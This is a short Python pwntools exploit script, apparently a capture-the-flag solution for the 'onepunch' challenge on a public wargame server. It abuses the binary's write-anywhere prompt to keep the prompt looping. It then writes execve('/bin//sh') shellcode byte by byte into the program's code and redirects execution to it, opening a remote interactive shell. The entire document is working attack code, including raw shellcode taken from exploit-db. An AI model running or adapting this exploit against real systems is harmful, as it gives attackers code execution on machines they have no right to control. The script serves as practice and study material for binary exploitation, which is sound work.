#-*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import binascii
import time
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'amd64', os = 'linux', log_level = 'debug')

def debug(addr = '0x000000000040075d'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)



elf = ELF('/home/h11p/hackme/onepunch')
stack_chk_fail=elf.got['__stack_chk_fail']
print "%x" % stack_chk_fail


#shellcode=asm(shellcraft.amd64.linux.sh())
#str_shellcode=str(binascii.b2a_hex(shellcode))
#https://www.exploit-db.com/exploits/36858/
shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
addr=0x0400769

#io = process('/home/h11p/hackme/onepunch')

io = remote('hackme.inndy.tw', 7718)

payload1 = '400768'
payload2 = '-61'


#debug()

time.sleep(1)
io.recvuntil('Where What?')
io.sendline(payload1)
io.sendline(payload2)
'''
for i in xrange(0,len(str_shellcode),2):
    io.sendline(hex(addr))
    io.sendline(str(int(str_shellcode[i:i+2],16)))
    addr=addr+0x1
'''


for i in shellcode:
    io.sendline(hex(addr))
    io.sendline(str(ord(i)))
    addr = addr + 0x1
io.sendline('4006f3')
io.sendline(str(255))
#io.recv()
io.interactive()

io.close()
